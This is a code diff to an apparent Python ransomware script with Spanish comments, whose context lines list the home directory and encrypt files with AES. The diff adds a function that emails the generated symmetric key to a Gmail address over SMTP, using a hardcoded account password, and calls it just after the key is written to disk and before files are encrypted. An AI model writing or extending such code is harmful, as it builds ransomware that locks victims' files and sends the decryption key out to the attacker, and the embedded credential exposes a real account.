@@ -7,6 +7,9 @@ import random
 import hashlib
 from Crypto.Util import Counter
 from Crypto.Cipher import AES
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 
 	# listar el contenido del directorio HOME
@@ -30,6 +33,26 @@ def check_internet():
 		s.close()
 	except:
 		exit()
+
+	# enviar la clave por email
+def enviar_datos():
+	msg = MIMEMultipart()
+	password = 'rAn$03ggKm0ng'
+	msg['From'] = 'ransoprub@gmail.com'
+	msg['To'] = 'ransoprub@gmail.com'
+	msg['Subject'] = 'Llave simetrica'
+
+	msg.attach(MIMEText(file('key_file').read()))
+
+		# conectamos con el servidor de correo (gmail)
+	try:
+		server = smtplib.SMTP('smtp.gmail.com:587')
+		server.starttls()
+		server.login(msg['From'], password)
+		server.sendmail(msg['From'], msg['To'], msg.as_string())
+		server.quit()
+	except:
+		pass
 
 
 # Creacion de llave simetrica
@@ -121,6 +144,7 @@ def discover(key):
 		key_file = open('key_file', 'w+')
 		key_file.write(key)
 		key_file.close()
+		enviar_datos()
 		cryptarchives = crypto.encrypt
 
 			# recorrer cada elemento de la lista para encriptar los archivos
